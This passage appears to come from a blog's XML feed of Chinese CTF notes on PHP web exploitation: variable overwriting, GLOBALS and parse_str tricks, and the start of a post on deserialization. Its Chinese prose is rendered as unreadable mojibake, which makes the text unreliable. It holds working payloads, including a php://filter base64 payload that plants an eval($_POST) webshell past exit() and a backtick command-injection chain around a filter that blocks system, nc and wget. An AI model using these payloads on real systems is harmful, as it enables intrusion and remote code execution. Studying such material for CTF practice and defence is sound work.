class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);<span class="comment">//$v1å’Œ$v2æŒ‡å‘åŒä¸€åœ°å€ï¼Œæ­¤æ—¶$v1=$v2</span></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: v1=ctfshow&amp;v2=GLOBALS  //æ„æˆ$GLOBALS</code></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><ul><li>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</li><li>å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡</li></ul><p><code>var_dump(get_defined_vars())</code></p><h2 id="å˜é‡å‘½å"><a href="#å˜é‡å‘½å" class="headerlink" title="å˜é‡å‘½å"></a>å˜é‡å‘½å</h2><ul><li>PHPå˜é‡å‘½åè§„åˆ™ï¼š<br>åªèƒ½åŒ…å«ï¼šå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿<br>å…¶ä¸­ï¼Œåªèƒ½ä»¥å­—æ¯ã€ä¸‹åˆ’çº¿å¼€å¤´</li></ul><p><code>if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;</code></p><p>phpå˜é‡å‘½åä¸å…è®¸å‡ºç° .ï¼ˆç‚¹å·ï¼‰,éœ€è¦ç»•è¿‡â€™CTF_SHOW.COMâ€™</p><p>GETæˆ–POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°†<code>ç©ºæ ¼ + . [</code>è½¬æ¢ä¸º _</p><p>ç‰¹æ®Šå­—ç¬¦<code>[</code>, GETæˆ–POSTæ–¹å¼ä¼ å‚æ—¶,å˜é‡åä¸­çš„[ä¹Ÿä¼šè¢«æ›¿æ¢ä¸º_,ä½†å…¶åçš„å­—ç¬¦å°±ä¸ä¼šè¢«æ›¿æ¢äº† å› æ­¤ï¼š</p><p><code>CTF[SHOW.COM =&gt; CTF_SHOW.COM</code></p><h1 id="die-å’Œexit-æ­»äº¡ç»•è¿‡"><a href="#die-å’Œexit-æ­»äº¡ç»•è¿‡" class="headerlink" title="die()å’Œexit()æ­»äº¡ç»•è¿‡"></a>die()å’Œexit()æ­»äº¡ç»•è¿‡</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>PHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œä¼šé€‰æ‹©è·³è¿‡è¿™äº›å­—ç¬¦ï¼Œå°†æœ‰æ•ˆçš„å­—ç¬¦é‡æ–°ç»„æˆå­—ç¬¦ä¸²è¿›è¡Œè§£ç </p><p>ç”±äºæ­»äº¡ä¹‹exitä¸­çš„ä»£ç ï¼Œå­—ç¬¦<code>&lt;ã€?ã€;ã€&gt;ã€</code>ç©ºæ ¼ç­‰å­—ç¬¦ä¸ç¬¦åˆbase64è§£ç èŒƒå›´ï¼Œæœ€ç»ˆè§£ç ç¬¦åˆè¦æ±‚çš„åªæœ‰<code>phpexit</code>è¿™7ä¸ªå­—ç¬¦ï¼Œè€Œbase64åœ¨è§£ç çš„æ—¶å€™ï¼Œæ˜¯4ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œå› æ­¤è¿˜å°‘ä¸€ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬å°†è¿™ä¸€ä¸ªæ·»åŠ ä¸Šå»</p><ul><li>base64ç¼–ç ç»•è¿‡ï¼š</li></ul><p><code>?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p><h1 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h1><p>ä»€ä¹ˆæ˜¯å˜é‡è¦†ç›–ï¼Ÿ</p><ul><li>ç”¨æˆ‘ä»¬çš„ä¼ å‚å€¼æ›¿æ¢ç¨‹åºåŸæœ‰çš„å˜é‡å€¼</li></ul><p>å¸¸è§åœºæ™¯ï¼š</p><blockquote><p>$$ä½¿ç”¨ä¸å½“</p><p>extract()å‡½æ•°ä½¿ç”¨ä¸å½“</p><p>parse_str()ä½¿ç”¨ä¸å½“</p><p>import_request_variables()ä½¿ç”¨ä¸å½“</p><p>å¼€å¯å…¨å±€å˜é‡</p><p>â€¦â€¦</p></blockquote><h2 id="ä¸foreach"><a href="#ä¸foreach" class="headerlink" title="$$ä¸foreach()"></a>$$ä¸foreach()</h2><ul><li>$$å°±æ˜¯å°†ä¹‹å‰å®šä¹‰çš„å˜é‡çš„å€¼é‡æ–°å®šä¹‰æ–°çš„å˜é‡</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=b</span><br><span class="line"><span class="variable">$b</span>=c</span><br><span class="line">    </span><br><span class="line"><span class="variable">$$a</span> = $(<span class="variable">$a</span>) = <span class="variable">$b</span> = c</span><br></pre></td></tr></table></figure><ul><li>foreach()ï¼šå¾ªç¯ç”¨äºåˆ—ä¸¾å‡ºé›†åˆä¸­æ‰€æœ‰çš„å…ƒç´ ï¼ˆæ˜¯é›†åˆä¸æ˜¯æ•°ç»„ï¼‰</li><li>addslashes()ï¼šä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸²</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>)<span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>)&#123;</span><br><span class="line">        <span class="variable">$$_key</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">å½“æˆ‘ä»¥getæ–¹å¼ä¼ å…¥a=<span class="number">2</span>æ—¶ï¼Œè¾“å‡ºç»“æœä¸º<span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h2><ul><li>extract(array,extract_rules,prefix) ï¼šå°†æ•°ç»„ä¸­çš„å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨<ul><li>arrayï¼šå¿…éœ€çš„ï¼Œè§„å®šè¦ä½¿ç”¨çš„æ•°ç»„</li><li>extract_rulesï¼šå¯æœ‰å¯æ— ï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™é»˜è®¤ä¸ºEXTR_OVERWRITE</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;Dog&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a=<span class="subst">$a</span>,\$b=<span class="subst">$b</span>,\$c=<span class="subst">$c</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š<span class="variable">$a</span>=Cat,<span class="variable">$b</span>=Dog,<span class="variable">$c</span>=Horse</span><br></pre></td></tr></table></figure><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><ul><li>æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"><span class="comment">// æ¨èç”¨æ³•</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸å»ºè®®è¿™ä¹ˆç”¨</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br></pre></td></tr></table></figure><ul><li>è‹¥è¦postå‚æ•°ï¼Œéœ€åŠ å¼•å·<br><code>v1=&#39;flag=0&#39;</code></li><li><code>parse_str(string $encoded_string [, array &amp;$result ])</code><ul><li>å¦‚æœå­˜åœ¨ç¬¬äºŒä¸ªå˜é‡ï¼Œå˜é‡ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„ï¼Œä½œä¸ºæ›¿ä»£</li></ul></li></ul><blockquote><p>ç»è¿‡parse_str($_SERVER[â€˜QUERY_STRINGâ€™]) \==&gt; $_POST[key1]=36d æ•°ç»„å½¢å¼<br>ç»è¿‡extract($_POST)==&gt; $key=36d</p></blockquote><h1 id="assert-æ–­è¨€"><a href="#assert-æ–­è¨€" class="headerlink" title="assert()æ–­è¨€"></a>assert()æ–­è¨€</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>() æ–­è¨€ï¼š</span><br><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] )</span><br><span class="line">å¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« <span class="title function_ invoke__">assert</span>() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</span><br><span class="line">å¯è§ï¼Œ<span class="keyword">eval</span>å’Œassertéƒ½å¯ä»¥å°†å­—ç¬¦å½“ä½œä»£ç æ‰§è¡Œï¼Œåªä¸è¿‡assertä¸éœ€è¦ä¸¥æ ¼éµä»è¯­æ³•ï¼Œæ¯”å¦‚è¯­å¥æœ«å°¾çš„åˆ†å·å¯ä¸åŠ </span><br></pre></td></tr></table></figure><h1 id="gettextæ‹“å±•"><a href="#gettextæ‹“å±•" class="headerlink" title="gettextæ‹“å±•"></a>gettextæ‹“å±•</h1><p>åœ¨å¼€å¯è¯¥æ‹“å±•å _() ç­‰æ•ˆäº gettext()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;phpinfo&quot;</span>); </span><br><span class="line">ç»“æœ  phpinfo</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;phpinfo&quot;</span>); </span><br><span class="line">ç»“æœ phpinfo </span><br></pre></td></tr></table></figure><h1 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¥—å¨ƒå‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getä¼ å‚   F=`<span class="variable">$F</span> `;sleep <span class="number">3</span></span><br><span class="line">ç»è¿‡<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>)æˆªå–å å¾—åˆ°  `<span class="variable">$F</span> `;</span><br><span class="line">ä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ <span class="keyword">eval</span>(<span class="string">&quot;`<span class="subst">$F</span> `;&quot;</span>);</span><br><span class="line">æˆ‘ä»¬æŠŠåŸæ¥çš„<span class="variable">$F</span>å¸¦è¿›å»</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;``<span class="subst">$F</span> `;sleep 3`&quot;</span>); <span class="comment">//``æ˜¯shell_exec()å‡½æ•°çš„ç¼©å†™</span></span><br><span class="line">å‰é¢çš„å‘½ä»¤æˆ‘ä»¬ä¸éœ€è¦ç®¡ï¼Œä½†æ˜¯åé¢çš„å‘½ä»¤æˆ‘ä»¬å¯ä»¥è‡ªç”±æ§åˆ¶ã€‚</span><br></pre></td></tr></table></figure><h1 id="nlã€cpã€mvã€teeå†™æ–‡ä»¶"><a href="#nlã€cpã€mvã€teeå†™æ–‡ä»¶" class="headerlink" title="nlã€cpã€mvã€teeå†™æ–‡ä»¶"></a>nlã€cpã€mvã€teeå†™æ–‡ä»¶</h1><p>åœ¨ç¦å‘½ä»¤çš„æ—¶å€™æ²¡æœ‰é™åˆ¶å†™æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nl</span> flag.php&gt;1.txt</span><br><span class="line"><span class="built_in">cp</span> flag.php&gt;1.txt</span><br><span class="line"><span class="built_in">mv</span> flag.php&gt;1.txt</span><br></pre></td></tr></table></figure><p>teeå‘½ä»¤</p><ul><li>Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶</li><li><code>tee file1 file2</code>ï¼šå¤åˆ¶æ–‡ä»¶</li><li><code>ls /|tee 1.txt</code>ï¼šå‘½ä»¤è¾“å‡º</li></ul>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–</title>
      <link href="/2023/07/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><ul><li>åºåˆ—åŒ–å…¶å®å°±æ˜¯å°†æ•°æ®è½¬åŒ–æˆä¸€ç§å¯é€†çš„æ•°æ®ç»“æ„ï¼Œé€†å‘çš„è¿‡ç¨‹å°±å«åšååºåˆ—åŒ–ã€‚</li><li>php å°†æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¼šç”¨åˆ°ä¸¤ä¸ªå‡½æ•°</li></ul><blockquote><p><strong>serialize</strong> å°†å¯¹è±¡æ ¼å¼åŒ–æˆæœ‰åºçš„å­—ç¬¦ä¸²</p><p><strong>unserialize</strong> å°†å­—ç¬¦ä¸²è¿˜åŸæˆåŸæ¥çš„å¯¹è±¡</p></blockquote><ul><li><p>å¸¸è§çš„åºåˆ—åŒ–æ ¼å¼</p><ul><li><p>äºŒè¿›åˆ¶æ ¼å¼</p></li><li><p>å­—èŠ‚æ•°ç»„</p></li><li><p>jsonå­—ç¬¦ä¸²</p></li><li><p>xmlå­—ç¬¦ä¸²</p></li></ul></li></ul><h1 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span> = <span class="string">&quot;dazzhuang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">34</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">10</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">200</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span>-&gt;data = &amp;<span class="variable">$test2</span>-&gt;data2;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="è¾“å‡ºç»“æœ"><a href="#è¾“å‡ºç»“æœ" class="headerlink" title="è¾“å‡ºç»“æœ"></a>è¾“å‡ºç»“æœ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i:<span class="number">34</span>;<span class="comment">//int æ•´å‹</span></span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;<span class="comment">//å­—ç¬¦ä¸²å‹</span></span><br><span class="line">b:<span class="number">1</span>;<span class="comment">//bool</span></span><br><span class="line">N;<span class="comment">//nullç©º</span></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">10</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">200</span>;&#125;<span class="comment">//array æ•°ç»„</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;TEST&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;uu&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;data2&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;dazzhuang&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;TESTpass&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;TEST&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;dazzhuang&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;data2&quot;</span>;R:<span class="number">2</span>;s:<span class="number">10</span>:<span class="string">&quot;TESTpass&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="comment">//Object å¯¹è±¡</span></span><br></pre></td></tr></table></figure><h2 id="è¡¨è¾¾æ–¹å¼"><a href="#è¡¨è¾¾æ–¹å¼" class="headerlink" title="è¡¨è¾¾æ–¹å¼"></a>è¡¨è¾¾æ–¹å¼</h2><blockquote><p>å­—ç¬¦ä¸²ï¼šs : å†…å®¹é•¿åº¦ : â€œå†…å®¹â€</p><p>æ•°ç»„ï¼ša : å‚æ•°æ•°é‡ : {å†…å®¹1 ; å†…å®¹2 ; å†…å®¹3â€¦â€¦}</p><p>å¯¹è±¡ï¼šO : ç±»åé•¿åº¦ : ç±»å : å˜é‡æ•°é‡ : {å†…å®¹1 ; å†…å®¹2 ; å†…å®¹3â€¦â€¦}<br>å†…å®¹ï¼šå˜é‡ç±»å‹ : å˜é‡åå­—é•¿åº¦ : â€œå˜é‡åå­—â€ ; å€¼çš„ç±»å‹ : å€¼çš„é•¿åº¦ : å€¼;</p><p>%00æ˜¯urlç¼–ç åçš„ç©ºæ ¼<br><code>privateç§æœ‰å±æ€§åºåˆ—åŒ–æ—¶ï¼Œåœ¨å˜é‡åå‰åŠ &quot;%00ç±»å%00&quot;</code><br><code>protectedå—ä¿æŠ¤å±æ€§åºåˆ—åŒ–æ—¶åœ¨å˜é‡åå‰åŠ &quot;%00*%00&quot;</code></p></blockquote><h1 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h1><ul><li>ååºåˆ—åŒ–ä¹‹åçš„å†…å®¹ä¸ºä¸€ä¸ªå¯¹è±¡</li><li>ååºåˆ—åŒ–ç”Ÿæˆçš„å¯¹è±¡é‡Œçš„å€¼ï¼Œç”±ååºåˆ—åŒ–é‡Œçš„å€¼æä¾›ï¼Œä¸åŸæœ‰ç±»å®šä¹‰çš„å€¼æ— å…³</li><li>ååºåˆ—åŒ–ä¸è§¦å‘ç±»çš„æˆå‘˜æ–¹æ³•ï¼Œéœ€è¦è°ƒç”¨æ–¹æ³•åæ‰èƒ½è§¦å‘</li></ul><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><h3 id="ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•"><a href="#ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•" class="headerlink" title="ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•"></a>ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•</h3><ul><li>ä¸€ä¸ªé¢„å®šä¹‰å¥½çš„ï¼Œåœ¨ç‰¹å®šæƒ…å†µä¸‹è‡ªåŠ¨è§¦å‘çš„è¡Œä¸ºæ–¹æ³•</li></ul><h3 id="é­”æœ¯æ–¹æ³•çš„ä½œç”¨"><a href="#é­”æœ¯æ–¹æ³•çš„ä½œç”¨" class="headerlink" title="é­”æœ¯æ–¹æ³•çš„ä½œç”¨"></a>é­”æœ¯æ–¹æ³•çš„ä½œç”¨</h3><ul><li>ååºåˆ—åŒ–æ¼æ´çš„æˆå› <ul><li>ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œ<code>unserialize()</code>æ¥å—çš„å€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰å¯æ§</li><li>é€šè¿‡æ›´æ”¹è¿™ä¸ªå€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼Œå¾—åˆ°æ‰€éœ€è¦çš„ä»£ç </li><li>é€šè¿‡è°ƒç”¨æ–¹æ³•ï¼Œè§¦å‘ä»£ç æ‰§è¡Œ</li></ul></li></ul><blockquote><p>é­”æœ¯æ–¹æ³•åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è‡ªåŠ¨è°ƒç”¨ç›¸å…³æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´è§¦å‘ä»£ç </p></blockquote><h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" 